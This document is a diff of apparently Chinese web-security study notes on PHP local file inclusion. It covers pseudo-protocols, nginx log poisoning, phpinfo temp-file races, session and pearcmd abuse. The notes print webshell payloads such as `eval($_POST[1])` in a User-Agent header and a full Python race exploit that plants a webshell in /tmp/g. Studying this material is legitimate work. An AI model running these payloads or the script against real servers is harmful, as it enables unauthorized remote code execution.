+<p>include “路径”：包含并运行路径下的文件；如果文件内容包含php标记，会直接运行该php代码，如果没有，会直接按照文本输出</p>
+<h4 id="php文件包含函数、语言结构">php文件包含函数、语言结构</h4>
 <ul>
 <li>include : 找不到文件时返回warning，可继续运行</li>
 <li>require：找不到文件返回fatal(致命错误)，不能继续运行</li>
@@ -640,8 +625,8 @@ p：表示打印匹配到的行。</p>
 </ul>
 <h4 id="文件包含漏洞">文件包含漏洞</h4>
 <p>文件包含的内容用户可控，相当于任意位置文件读取（本身可回显）</p>
-<h3 id="php伪协议路径">php伪协议(“路径”)</h3>
-<h4 id="基础知识-1">基础知识</h4>
+<h3 id="php伪协议-“路径”">php伪协议(“路径”)</h3>
+<h4 id="基础知识-2">基础知识</h4>
 <p>协议：通信双方的一些约定；</p>
 <p>应用层协议：</p>
 <ul>
@@ -662,20 +647,19 @@ p：表示打印匹配到的行。</p>
 <p>构成url路径；</p>
 <p>使用：</p>
 <ul>
-<li>include "url" ：(需要去pip.ini开启url_include)</li>
-<li>file_get_content("路径")
-:路径可以是本地路径（本地文件），也可以是url路径（远程主机文件）</li>
+<li>include “url”  ：(需要去pip.ini开启url_include)</li>
+<li>file_get_content(“路径”) :路径可以是本地路径（本地文件），也可以是url路径（远程主机文件）</li>
 </ul>
 <h5 id="ftp">ftp://</h5>
 <p>默认21端口，读取远程服务器文件;</p>
 <p>使用：<code>include ftp://xx/xx</code></p>
-<h5 id="phpinput">php://input</h5>
+<h5 id="php-input">php://input</h5>
 <p>可以看成是一个路径，<strong>指向POST提交数据处</strong>；可以读取POST请求提交的原始数据，且可以不用key-value格式（虽然hackbar会自动过滤该请求）</p>
 <p>使用：<code>include php://input</code>，可输出php代码进行利用（需要有php标记才会执行）</p>
-<h5 id="phpfilter">php://filter</h5>
+<h5 id="php-filter">php://filter</h5>
 <p>也可以看成是一个路径，不过其包含过滤器，可以对路径下的文件内容进行处理</p>
 <p>使用：<code>file_put_contents($filenema,$content)</code>，filename可以使用<code>php://filter</code></p>
-<p>​ 也可用于直接读取当前目录下文件。</p>
+<p>​			也可用于直接读取当前目录下文件。</p>
 <p>作用：</p>
 <ul>
 <li>过滤绕过：base64编码后解码</li>
@@ -691,23 +675,19 @@ p：表示打印匹配到的行。</p>
 <p>例如：</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">url/?cmd=data://text/plain/,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">其中//text/plain/可以省略</span><br></code></pre></td></tr></table></figure>
 <h3 id="php的强制文件上传机制">php的强制文件上传机制</h3>
-<p>可以给一个php文件强制上传一个本地文件，该本地文件会临时存放在/tmp/phpxxxxxx，在$_FILES全局变量中会存储相关信息,最后一位有1/3的概率是大写字母（使用[
-@-[
-]]）进行匹配，该临时文件的生命周期是原php文件的执行周期，原php文件执行完毕后改临时文件会被删除。</p>
+<p>可以给一个php文件强制上传一个本地文件，该本地文件会临时存放在/tmp/phpxxxxxx，在$_FILES全局变量中会存储相关信息,最后一位有1/3的概率是大写字母（使用[ @-[ ]]）进行匹配，该临时文件的生命周期是原php文件的执行周期，原php文件执行完毕后改临时文件会被删除。</p>
 <p>文件上传表单：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;uploads&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>抓包，并通过本地强制文件上传路径传递GET参数（存储在超全局变量$_GET中），使用<code>.</code>执行本地文件，后接的空格可以使用<code>+</code>代替。</p>
 <h3 id="小总结">小总结</h3>
-<ol type="1">
+<ol>
 <li>文件名可控</li>
 </ol>
-<p>include $file."php" ：
-使用data协议，php标签闭合后面的<code>.php</code></p>
-<ol start="2" type="1">
+<p>include $file.“php”  ： 使用data协议，php标签闭合后面的<code>.php</code></p>
+<ol start="2">
 <li>文件后缀可控</li>
 </ol>
-<p>include "/var/www/html".$file
-：这种情况下大多数伪协议无法使用，可以使用目录穿越。</p>
+<p>include “/var/www/html”.$file ：这种情况下大多数伪协议无法使用，可以使用目录穿越。</p>
 <h3 id="nginx日志文件包含">nginx日志文件包含</h3>
 <h4 id="nginx原理">nginx原理</h4>
 <p>nginx是一个服务器软件，提供http服务，默认监听80端口；</p>
@@ -716,7 +696,7 @@ p：表示打印匹配到的行。</p>
 <p>若不是，则由nginx自己处理，找到Web目录，读取内容返回给浏览器，并告诉浏览器相应的格式。</p>
 <h4 id="nginx日志文件利用">nginx日志文件利用</h4>
 <p>将每条操作记录存储在<code>access.log</code>文件中，可以通过控制<code>User-Agent</code>字段（原封不动地存储）的内容来实现代码执行。</p>
-<p>注意：
+<p>注意：<br>
 Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <p>写<code>User-Agent</code>时需要一次写对，否则会污染环境。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent:<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">//phpinfo()用于定位</span><br></code></pre></td></tr></table></figure>
@@ -724,21 +704,20 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <p>有文件名完全可控的包含点（含有后缀不能利用）；</p>
 <p>默认nginx日志的路径不变。</p>
 <h3 id="临时文件包含">临时文件包含</h3>
-<p>参考：https://www.anquanke.com/post/id/201136</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p>
 <h4 id="原理">原理</h4>
 <p>前提知识点：参考php强制文件上传机制</p>
-<p>在文件包含中，include
-“/???/????????[@-[]”是错误，路径不能含有通配符</p>
+<p>在文件包含中，include “/???/???[@-[]”是错误，路径不能含有通配符</p>
 <p>所以，想要利用该文件，必须得到文件全称。</p>
 <p><strong>知识点：</strong></p>
-<ol type="1">
+<ol>
 <li>php每次向浏览器返回数据时，会以块(4096个字符)为单位，当超过4096个字符后，会一块一块地返回。</li>
 <li>强制文件上传的相关信息（包括文件名）会存储在全局变量$_FILES中的‘tmp_name’，可在phpinfo()中查看</li>
 </ol>
-<h4 id="phpinfo_lfi利用">phpinfo_lfi利用</h4>
+<h4 id="phpinfo-lfi利用">phpinfo_lfi利用</h4>
 <p>存在问题：</p>
 <p>文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
-<p>利用原理：
+<p>利用原理：<br>
 向phpinfo()页面强制上传本地文件（包含恶意代码），增加phpinfo()的长度，拖慢执行过程，在该过程中读取$_FILES中的‘tmp_name’获取上传的文件路径，进行文件包含即可。</p>
 <p>利用过程：</p>
 <p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
@@ -751,8 +730,8 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python </span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">host, port</span>):<br>    TAG=<span class="hljs-string">&quot;Security Test&quot;</span><br>    PAYLOAD=<span class="hljs-string">&quot;&quot;&quot;%s\r</span><br><span class="hljs-string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG<br>    REQ1_DATA=<span class="hljs-string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="hljs-string">Content-Type: text/plain\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s</span><br><span class="hljs-string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD<br>    padding=<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">5000</span><br><span class="hljs-comment">###REQ1包含强制上传文件的内容及大量的垃圾数据</span><br>    REQ1=<span class="hljs-string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Length: %s\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s&quot;&quot;&quot;</span> %(<span class="hljs-built_in">len</span>(REQ1_DATA),host,REQ1_DATA)<br>    <span class="hljs-comment">#modify this to suit the LFI script </span><br><span class="hljs-comment">###进行include文件包含利用</span><br>    LFIREQ=<span class="hljs-string">&quot;&quot;&quot;GET /?file=%s HTTP/1.1\r</span><br><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><br><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<br><br><span class="hljs-comment">###核心利用代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phpInfoLFI</span>(<span class="hljs-params">host, port, phpinforeq, offset, lfireq, tag</span>):<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <br><br>    s.connect((host, port))<br>    s2.connect((host, port))<br><br>    <span class="hljs-comment">#强制文件上传</span><br>    s.send(phpinforeq)<br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d) &lt; offset:<br>        d += s.recv(offset)<br>    <span class="hljs-keyword">try</span>:<br>        i = d.index(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">###文件包含利用</span><br>    s2.send(lfireq % (fn, host))<br>    d = s2.recv(<span class="hljs-number">4096</span>)<br>    s.close()<br>    s2.close()<br><br>    <span class="hljs-keyword">if</span> d.find(tag) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> fn<br><br>counter=<span class="hljs-number">0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWorker</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, l, m, *args</span>):<br>        threading.Thread.__init__(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-variable language_">self</span>.event = e<br>        <span class="hljs-variable language_">self</span>.lock =  l<br>        <span class="hljs-variable language_">self</span>.maxattempts = m<br>        <span class="hljs-variable language_">self</span>.args = args<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> counter<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.event.is_set():<br>            <span class="hljs-keyword">with</span> <span class="hljs-variable language_">self</span>.lock:<br>                <span class="hljs-keyword">if</span> counter &gt;= <span class="hljs-variable language_">self</span>.maxattempts:<br>                    <span class="hljs-keyword">return</span><br>                counter+=<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">try</span>:<br>                x = phpInfoLFI(*<span class="hljs-variable language_">self</span>.args)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.event.is_set():<br>                    <span class="hljs-keyword">break</span>                <br>                <span class="hljs-keyword">if</span> x:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nGot it! Shell created in /tmp/g&quot;</span><br>                    <span class="hljs-variable language_">self</span>.event.<span class="hljs-built_in">set</span>()<br>                    <br>            <span class="hljs-keyword">except</span> socket.error:<br>                <span class="hljs-keyword">return</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOffset</span>(<span class="hljs-params">host, port, phpinforeq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host,port))<br>    s.send(phpinforeq)<br>    <br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = s.recv(<span class="hljs-number">4096</span>)<br>        d+=i        <br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># detect the final chunk</span><br>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">&quot;0\r\n\r\n&quot;</span>):<br>            <span class="hljs-keyword">break</span><br>    s.close()<br>    i = d.find(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> i == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No php tmp_name in phpinfo output&quot;</span>)<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="hljs-number">10</span>],i)<br>    <span class="hljs-comment"># padded up a bit</span><br>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span>     <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LFI With PHPInfo()&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;-=&quot;</span> * <span class="hljs-number">30</span><br><br>    <span class="hljs-comment">###一些参数检查</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span> socket.error, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="hljs-number">1</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    port=<span class="hljs-number">80</span><br>    <span class="hljs-keyword">try</span>:<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">2</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <br>    poolsz=<span class="hljs-number">10</span><br>    <span class="hljs-keyword">try</span>:<br>        poolsz = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">3</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Getting initial offset...&quot;</span>,  <br>    <span class="hljs-comment">###设置POST包格式</span><br>    reqphp, tag, reqlfi = setup(host, port)<br>    <span class="hljs-comment">###读出tmp_name所在位置</span><br>    offset = getOffset(host, port, reqphp)<br><br>    sys.stdout.flush()<br><br>    maxattempts = <span class="hljs-number">1000</span><br>    e = threading.Event()<br>    l = threading.Lock()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz<br>    sys.stdout.flush()<br><br>    tp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,poolsz):<br>        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.start()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> e.is_set():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> l:<br>                sys.stdout.write( <span class="hljs-string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))<br>                sys.stdout.flush()<br>                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">if</span> e.is_set():<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Woot!  \m/&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;:(&quot;</span><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nTelling threads to shutdown...&quot;</span><br>        e.<span class="hljs-built_in">set</span>()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Shuttin&#x27; down...&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
 <h3 id="php的session文件包含">php的session文件包含</h3>
 <p>cookie与session基本知识补充：</p>
-<p>https://blog.csdn.net/weixin_40228200/article/details/127977296</p>
-<p>https://gezhigu.blog.csdn.net/article/details/133805025?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/127977296">https://blog.csdn.net/weixin_40228200/article/details/127977296</a></p>
+<p><a target="_blank" rel="noopener" href="https://gezhigu.blog.csdn.net/article/details/133805025?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1">https://gezhigu.blog.csdn.net/article/details/133805025?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133805025-blog-116228070.235^v43^pc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133805025-blog-116228070.235^v43^pc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</a></p>
 <p>简单理解：</p>
 <p>session可以跨页面共享数据，session文件的名称可以通过Cookie获得，可以通过上传<code>PHP_SESSION_UPLOAD_PROGRESS</code>表单来写session文件；</p>
 <p>但session文件内容会在一次会话结束后自动清除，可以通过多线程来实现边写边读，脚本如下：</p>
@@ -762,18 +741,17 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <p>pear，全称PIP EXTENSION AND APPLICATION REPOSITORY，php包管理工具</p>
 <p>默认安装位置：/usr/local/lib/php</p>
 <h4 id="利用条件">利用条件</h4>
-<ol type="1">
+<ol>
 <li>有文件包含点</li>
 <li>开启了pear拓展</li>
-<li>配置文件中<code>register_argv-argc</code>（argv、argc存储命令行参数和参数个数）设置为On,当开启了这个选项，用户的输入将会被赋予给<span class="math inline">\(argc、\)</span>argv、$_SERVER['argv']几个变量。</li>
+<li>配置文件中<code>register_argv-argc</code>（argv、argc存储命令行参数和参数个数）设置为On,当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[‘argv’]几个变量。</li>
 </ol>
 <h4 id="利用点">利用点</h4>
 <p><strong>知识点：</strong></p>
-<p>​
-当不使用命令行形式处理php文件时，HTTP数据包中的query-string（不包含没有编码的<code>=</code>，且请求是GET或HEAD）会处理为$_SERVER['argv']中的值，也就是命令行参数。</p>
-<p>​ 所以我们可以通过Web访问pear命令行的功能，且能够控制命令行参数。</p>
+<p>​	当不使用命令行形式处理php文件时，HTTP数据包中的query-string（不包含没有编码的<code>=</code>，且请求是GET或HEAD）会处理为$_SERVER[‘argv’]中的值，也就是命令行参数。</p>
+<p>​	所以我们可以通过Web访问pear命令行的功能，且能够控制命令行参数。</p>
 <p>pear中可以利用的参数：</p>
-<ol type="1">
+<ol>
 <li>config-create:</li>
 </ol>
 <p>这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
@@ -782,24 +760,21 @@ Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
 <p>将内容<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?</code>写入<code>/tmp/hello.php</code>文件。</p>
 <p>由于<code>$_SERVER['argv']</code>变量会将URL的<code>?</code>后面的值都传入pear当作参数，所以此处<code>file</code>需要调换一下位置，GET请求中的file的值保持不变。</p>
 <p>pear命令的处理是送argv[1]开始的。<code>+</code>不可忽略，相当于argv[0]是一个空参数。</p>
-<ol start="2" type="1">
+<ol start="2">
 <li>install：</li>
 </ol>
 <p>远程文件下载，<code>install -R 下载到的路径 http://xxx(远程文件的位置)</code></p>
 <p>payload:</p>
